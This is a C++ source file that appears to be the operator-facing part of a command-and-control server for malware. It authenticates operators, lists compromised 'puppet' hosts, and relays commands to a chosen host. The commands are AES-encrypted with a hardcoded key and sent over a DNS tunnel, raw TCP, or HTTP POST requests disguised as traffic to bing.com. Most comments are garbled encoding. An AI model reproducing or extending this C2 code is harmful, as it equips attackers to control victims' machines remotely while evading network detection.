//ControlManager.cpp

#include "ControlManager.h"
#include "PuppetConnectDispatcher.h"
#include "PuppetManager.h"
#include "AES.h"
#include "DNS.h"

std::string httpEncapsulation(std::string command) {
    // ���������峤��
    std::string contentLength = "Content-Length: " + std::to_string(command.size()) + "\r\n";

    // ��������HTTP/1.1��׼������
    std::string httpStr =
        "POST / HTTP/1.1\r\n"
        "Host: bing.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: keep-alive\r\n"
        + contentLength +
        "\r\n"; // ���зָ�ͷ����body

    return httpStr + command;
}

void ControlHandle(int clientID, SOCKET clientSocket, ServerManager* serverManager, ClientConnectionManager& instance) {

    char buffer[BUFFER_SIZE] = { 0 };

    //�����û�����֤��Ϣ
    while (instance.getGRunning()) {

        char authentication_buff[BUFFER_SIZE] = { 0 };

        int bytesReceived = recv(clientSocket, authentication_buff, BUFFER_SIZE, 0);

        if (bytesReceived <= 0) {

            safePrint("���ƶ�id: ", clientID, " ip: ", instance.getClient(clientID)->getIp(), " ��֤����!!!");

            instance.getAllClient().erase(clientID);

            if (instance.getActiveClientID() == clientID) {
                instance.setActiveClientID(-1);
            }
            return;
        }

        authentication_buff[bytesReceived] = '\0';

        std::string userAndPassCode = authentication_buff;
        std::istringstream input_stream(userAndPassCode);
        std::string userName = "";
        std::string passCodeTmp = "";
        std::string passResultPass = "pass!!!";
        std::string passResultNoPass = "fail!!!";

        std::getline(input_stream, userName, ':');
        std::getline(input_stream, passCodeTmp);

        if (passCodeTmp == instance.getPassCode()) {

            if (send(clientSocket, passResultPass.c_str(), passResultPass.size(), 0) == SOCKET_ERROR) {
                std::cerr << "����ʧ��: " << WSAGetLastError() << std::endl;
            }

            instance.getClient(clientID)->setUserName(userName);

            break;
        }
        else
        {
            if (send(clientSocket, passResultNoPass.c_str(), passResultNoPass.size(), 0) == SOCKET_ERROR) {
                std::cerr << "����ʧ��: " << WSAGetLastError() << std::endl;
            }
        }
    }
    
    sendPuppetInfo(instance);//���µĿ��ƶ˼���ʱ��֪ͨ�䵱ǰ���������ӵĿ����б�

    while (instance.getGRunning()) {

        int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0);

        if (bytesReceived <= 0) {

            safePrint("���ƶ�id: ", clientID, " ip: ", instance.getClient(clientID)->getIp(), " �Ͽ�����!");

            closesocket(clientSocket);
            //instance.getAllClient().erase(clientID);
            instance.removeClient(clientID);

            if (instance.getActiveClientID() == clientID) {
                instance.setActiveClientID(-1);
            }
            return;
        }

        buffer[bytesReceived] = '\0';

        std::string command = buffer;

        //�����ƶ˵���������������        
        serverManager->setCmdList(stringCombination("[",instance.getClient(clientID)->getUserName(),"]", "$", command), true);

        if (command.find("show") != std::string::npos) {

            std::string puppet_list = "puppet list:\n";

            for (const auto& sockets : instance.getAllClient())
            {
                if (!sockets.second->isControl()) {

                    puppet_list.append(stringCombination("id:", std::to_string(sockets.second->getUserId()), "ip:", sockets.second->getIp(),"\n"));
                }
            }

            serverManager->setCmdList(puppet_list, false);
        }
        else if (command.find("listenerAdd:") != std::string::npos)
        {
            //����ӿ��ƶ˽��յ����Ӽ������������򴴽��������߳�
            puppetListenerCreate(command,serverManager,instance);
        }
        else
        {
            if (command.find("set ") != std::string::npos) {
                int newID = std::stoi(command.substr(4));
                std::map<int, std::shared_ptr<UserManager>> tmp_instance = instance.getAllClient();
                if (tmp_instance.find(newID) != tmp_instance.end()) {

                    instance.setActiveClientID(newID);

                    serverManager->setCmdList(stringCombination("current puppet id: ", std::to_string(newID)), false);
                }
                else {

                    serverManager->setCmdList(stringCombination("client id:", std::to_string(newID), "not found !!!"), false);
                }
                continue;
            }

            if (instance.getActiveClientID() == -1) {

                serverManager->setCmdList("please set the id: ", false);
                serverManager->setCmdList(command);

                continue;
            }

            std::shared_ptr<UserManager> user = instance.getAllClient()[instance.getActiveClientID()];

            if (user->getProtocol() == "dns") {

                DNSHeader header{};
                header.id = htons(1234);
                header.flags = htons(0x0100);  // ��׼��ѯ
                header.questions = htons(0x01);

                TunnelRequest request;
                TunnelResponse response;
                DNS dns(header, request, response);

                dns.sendRequest(user->getSocket(), command, user->getIp().c_str(),user->getPort());
            }
            else if(user->getProtocol() == "http")
            {

                SOCKET targetSocket = user->getSocket();

                std::string key = "weiweiSecretKey123!";

                command = Encrypt::encodeByAES(command, key);

                command = httpEncapsulation(command);//��װΪhttp post����

                if (send(targetSocket, command.c_str(), command.size(), 0) == SOCKET_ERROR) {

                    safePrint("����ʧ��: ", WSAGetLastError());
                }
            }
            else
            {
                SOCKET targetSocket = user->getSocket();

                std::string key = "weiweiSecretKey123!";

                command = Encrypt::encodeByAES(command, key);

                if (send(targetSocket, command.c_str(), command.size(), 0) == SOCKET_ERROR) {

                    safePrint("����ʧ��: ", WSAGetLastError());
                }
            }
        }
    }
}

// ������ƶ���������
void HandleClient(SOCKET listenSocket_client, ServerManager* serverManager, ClientConnectionManager& instance) {

    while (true) {

        sockaddr_in clientAddr{};
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket_client, (sockaddr*)&clientAddr, &clientAddrSize);

        if (clientSocket == INVALID_SOCKET) {

            safePrint("��������ʧ��!!!", WSAGetLastError());
            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

        {
            safePrint("\n���յ��ͻ�������, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
        }
        std::string protocol = "tcp";
        sockaddr_in clientSock;
        memset(&clientSock, 0, sizeof(clientSock));
        // ��������ʼ�� ClientInfo ����
        int clientID = clientAndPuppetConnectionDeal(instance, clientIP, clientSocket, clientSock, true, protocol,std::to_string(clientAddr.sin_port));

        //��������һ���߳���������ƶ˵Ľ���
        std::thread controlThread(ControlHandle, clientID, clientSocket, serverManager, std::ref(instance));
        controlThread.detach();
    }
}